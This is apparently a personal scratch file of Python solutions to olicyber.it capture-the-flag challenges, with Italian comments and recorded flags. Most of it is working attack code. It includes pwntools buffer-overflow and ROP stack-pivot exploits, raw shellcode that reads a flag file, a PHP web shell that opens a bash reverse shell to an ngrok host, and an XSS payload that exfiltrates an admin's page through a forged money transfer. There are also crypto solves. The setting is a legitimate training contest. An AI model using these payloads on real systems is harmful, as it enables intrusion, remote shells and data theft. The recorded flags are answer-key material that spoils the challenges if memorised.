#! /usr/bin/env python3

# region soundof silenze che non funziona
# import requests

# conn = requests.Session()

# url = 'http://soundofsilence.challs.olicyber.it/'
# res = conn.post(url, data ={'input[]':[]})

# print(res.text)
# endregion

# region benvenuti
# ciph = 'fmcj{yo_ackyzb_ihruvcvjam}'

# ans = ''
# for i in range(len(ciph)):
#     if ciph[i] == '{': 
#         ans += '{'
#         continue
#     elif ciph[i] == '}':
#         ans += '}'
#         continue
    #  elif ciph[i] == "_":
    #     ans += "_"
    #     continue
#     currentLetter = ord(ciph[i])
#     currentLetter -= i
#     if currentLetter < 97: currentLetter += 26
#     ans += chr(currentLetter)
# endregion

# print(ans)

# usb?
# flag{ti_stanno_tracciando}


# formatter 1
# 00401255

# from pwn import cyclic_gen, p64, process, ELF, remote

# cosa = ELF('./form')
# # conn = process(cosa.path)
# conn = remote('formatter.challs.olicyber.it',20006)
# g = cyclic_gen()

# payload = b'\A'*12 + g.get(32) + p64(0x00401255)

# conn.sendline(payload)
# conn.interactive()
# flag{jus7_l1k3_1n_th3_m0vi3!}
# from pwn import *

# cosa = ELF('./formatter')
# conn = process(cosa.path)
# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript= """
#     b*0x004014fa
#     c
# """)
# # format return overflowwww
# # format begin 0x0040132f
# # format leave b*0x004014fa
# # main begin 0x004014fc
# # 00401236 system_wrapper
# g = cyclic_gen()

# pop_rdi = 0x00000000004015e3
# payload = b'\A'*12 + g.get(16) + b'/bin/sh\x00' + b"A"*8 + p64(pop_rdi) + b'AAAAAAAA'
# print(payload)
# conn.recvuntil('formattata!')
# conn.send(payload)
# # conn.recvuntil('formattata!')
# # payload = b'\A'*12 + g.get(23) + p64(0x0040132f) + p64(0x004014fc)
# # conn.send(payload)
# conn.interactive()

from pwn import *
cosa = ELF('./formatter')
# conn = process(cosa.path)
conn = remote('formatter.challs.olicyber.it',20006)
# context.terminal = ['terminator', '-e'] 
# gdb.attach(conn, gdbscript= """
#     break *0x004014fa
#     c
# """)
# format return overflowwww
# format begin 0x0040132f
# format leave b*0x004014fa
# main begin 0x004014fc
# 00401236 system_wrapper
# p64(cosa.symbols['main'])
g = cyclic_gen()

pop_rdi = 0x00000000004015e3
leave_ret = 0x0000000000401252
ropchain = p64(pop_rdi)
# ropchain += b'/bin/sh\x00'
ropchain += p64(next(cosa.search(b'sh')))
# 00400527
ropchain += p64(cosa.symbols['system_wrapper']) 

rbp = p64(cosa.symbols['user_input']-0x8)
# payload = b'A'*3  + b'A'*5 + b'B'*8 + b"C"*8  + b'D'*8 + b'\A'*12 +  p64(cosa.symbols['main'])
payload = ropchain + b'\A' *12 + rbp + p64(leave_ret)
print(payload)
conn.sendlineafter('stringhe.\n', payload)
conn.interactive()
# flag{jus7_p1v0t_1t_4nd_h4v3_fun!}

# region ##########3 CANGURI
# from pwn import *

# cosa = ELF('./canguri')
# conn = remote('kangaroo.challs.olicyber.it',20005)
# g = cyclic_gen()

# percorso  = p64(next(cosa.search(b"/home/problemuser/flag.txt")))
# print(percorso)
# payload = g.get(72) + p64(0x004040c0)
# print(payload)
# conn.sendlineafter(b'sfidare la potenza dei binari?', payload)
# print(g.find('saaa'))

# # ispirazione da qua https://stackoverflow.com/questions/64498923/reading-files-content-and-printing-it-to-stdout-in-assembly-x64
# # shell buona, disassemblala per vedere come ho fatto
# finalShell = b'\x48\x31\xc0\x04\x02\xbf\xb5\x20\x40\x00\x48\x31\xf6\x0f\x05\x48\x89\xc7\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\x00\x02\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05'
# conn.sendlineafter(b'protezioni.\n', finalShell)
# conn.interactive()
# # flag{0ut_0f_b0undz_m8}

#endregion ###############3 END CANGURI



# region power of powers
# p = 128450990833487495239435278499085657422465092996722106047431474379143151314629045143653652944768444802270126846753537948967762324189664568189909545353158275858131431289893637086488338959187563881403307673553888146819064902112769916345947692089988589881442908285418049991125883165069766885822225248225468160077
# A = 61831614541939305862040056876011264769936869285032469572218837781265288482033241791534990631225173290721375634351599902243630440637381714029745389387353897742573052717098998922091234692501269689365490524265256453299907543933174039541594657578172478976649845569933968153837378526430401432124019877984375895208
# B = 19169934253633570053953889246265820259461044627728742350375954893919588299072764293478579241179090085989239364059384650171921501824319820596779078772556266872211628082012734698934949168060761839895907838286248824705923322959869662359391820142687075587901345158396605310756769873886803959078844393091746849299
# challenge = 56581528896983452515001967768248310545080265401766992662366067786016372851909638554447435589737014192896557318453781671822078909287435504086206205577004727253570958023360642429713834647404453446509100968023878907083686235506554652527774466716714231169976298056536775019633786807820118831080654365035445860396
# flag = bytes.fromhex('8d86c562e1296dbc9d383ad9c465dfb6bac904eb1ed913d8f4f6e36d2edc01e200c7ff4e710f0461a6ed68c3b755307efedae9097db0832ff6e4975f5ba168fe8ebc71a2dcabc4131abc9763c5f72a1c')

# from Crypto.Cipher import AES
# from hashlib import sha1
# B_inverse = pow(B,-1,p)

# maybe_SA = challenge * B_inverse % p # spero di aver annullato B grosso
# shared_alice = (A*maybe_SA)%p

# cipher = AES.new(sha1(shared_alice.to_bytes(128, byteorder = 'big')).digest()[:16], AES.MODE_ECB)
# enc = cipher.decrypt(flag)

# print(enc)

# flag{https://twitter.com/EllipticKiwi/status/1381695303414255617}
# endregion

# region small LFSR
# from Crypto.Cipher import AES

# key = bytes([103,69,-117+256,107,-58+256,35,123,50,105,-104+256,60,100,115,72,51,102]) 

# cipher = AES.new(key, AES.MODE_ECB)


# flag = bytes([228,103,219,48,239,152,201,100,43,106,186,18,72,198,186,38])

# print(cipher.decrypt(flag))
# flag{random_aes} lol
# print(key)


# ciph = bytes.fromhex('7dc0bc0397aa6f7c412f99720039840e6e1749072f9e350189c14cc12cff')

# five = ciph[:5]

# out = int(xor(five, b'flag{').hex(),16)
# initial_state = [int(x) for x in bin(out)[2:].rjust(40, '0')]
# # print(initial_state)
# # print(out, ciph)

# for j in range(2**16):
#     temp = initial_state + [int(x) for x in bin(j)[2:].rjust(16, '0')]
#     L = LFSR(temp)
#     k = b""
#     for i in range(len(ciph)):
#         k += bytes([int("".join(str(x) for x in L.gen_stream(8)), 2)])

#     flag = xor(ciph,k)

#     if  "\\x" not in str(flag):
#         print(flag, len(flag))
#         # break
#     if j %1000 == 0:
#         print(' sono arrivato a ',j)
#     # print(temp, len(temp))
    
# flag{y35_bu7_16_b175_4r3_345y}

# endregion

# region maledetta biondi
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
# https://book.hacktricks.xyz/pentesting-web/file-upload
# flag{ch1ss4_ch1_h4_m3ss0_qu3st0_l1m1t3_sull4_lungh3zz4?}
# <?php
# exec("/bin/bash -c 'bash -i > /dev/tcp/6.tcp.ngrok.io/12917 0>&1'");
# endregion


# region virtual bank
# ad ADmin, questo XSS a cui pu`o accedere anche lui
# var firstHttp = new XMLHttpRequest();
# firstHttp.open("GET", "http://virtualbank.challs.olicyber.it/history/1", false);
# firstHttp.send(null);

# var secondHttp = new XMLHttpRequest();
# var data = new FormData();
# data.append("to", "angelo");
# data.append("amount", "1");
# data.append("description", firstHttp.responseText);
# secondHttp.open("POST", "http://virtualbank.challs.olicyber.it/sendmoney", false);
# secondHttp.send(data);
# flag{c0nt3n7_s3cccccur1ty?_p0l1cy}
# endregion